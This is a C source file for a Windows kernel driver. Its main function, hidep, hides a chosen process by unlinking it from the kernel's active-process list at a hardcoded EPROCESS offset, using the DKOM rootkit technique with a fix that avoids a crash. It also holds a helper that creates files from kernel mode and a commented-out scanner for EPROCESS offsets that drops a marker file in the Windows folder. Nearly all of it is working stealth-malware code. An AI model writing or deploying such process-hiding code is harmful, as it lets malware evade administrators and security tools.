#include "Driver.h"

PCHAR hidep(UINT32 pid) {

	PEPROCESS currentProcess = PsGetCurrentProcess();
	ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440)); // (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));
	CurrentPID = (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));

	const ULONG LIST_OFFSET = 0x448;	// Offset in PEPROCESS for the linked list

	PLIST_ENTRY currentList = (LIST_ENTRY*)((ULONG_PTR)currentProcess + LIST_OFFSET);

	if (CurrentPID == pid) {

		PLIST_ENTRY prev = currentList->Blink;
		PLIST_ENTRY next = currentList->Flink;

		prev->Flink = next;
		next->Blink = prev;

		// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
		currentList->Blink = (PLIST_ENTRY)&currentList->Flink;
		currentList->Flink = (PLIST_ENTRY)&currentList->Flink;
	}
	
	return NULL;
}

void debugFile(WCHAR name[]) {

	// START
	NTSTATUS ntstatus = STATUS_SUCCESS;
	/////////////////////// THIS SECTION /////////////////////////////////////
	UNICODE_STRING     uniName;
	OBJECT_ATTRIBUTES  objAttr;
	////////////////////////////////\\SystemRoot\\ or C:\WINDOWS / C:|WINNT
	RtlInitUnicodeString(&uniName, name);  // or L"\\SystemRoot\\example.txt"
	InitializeObjectAttributes(&objAttr, &uniName,
		OBJ_CASE_INSENSITIVE,
		NULL, NULL);
	//////////////////////////////////

	///////////////////////////////////
	// Load the buffer (ie. contents of text file to the console)
	HANDLE handle;
	IO_STATUS_BLOCK    ioStatusBlock;
	ntstatus = ZwCreateFile(&handle,
		FILE_WRITE_DATA,
		&objAttr, &ioStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		0,
		FILE_OPEN_IF,
		FILE_NON_DIRECTORY_FILE,
		NULL, 0);

}


//ULONG find_eproc_pid() {
//
//	ULONG pid_ofs = 0;					// The offset we're looking for
//	ULONG pid = 0;		
//	PEPROCESS eproc;
//	// Select 3 process PIDs and get their EPROCESS Pointer
//	for (int i = 16;; i += 4) {
//
//		if (PsLookupProcessByProcessId((HANDLE)i, (PEPROCESS*)&eproc) == STATUS_SUCCESS) {
//			pid = i;
//			break;
//		}
//	}
//
//	for (int i = 0x20; i < 0x300; i += 4) {
//		if ((*(ULONG*)((UCHAR*)eproc + i) == pid))
//		{
//			debugFile(L"\\DosDevices\\C:\\Windows\\off.fnd");
//			pid_ofs = i; break;
//		}
//	}
//
//	
//	ObDereferenceObject(eproc);
//
//	return pid_ofs;
//}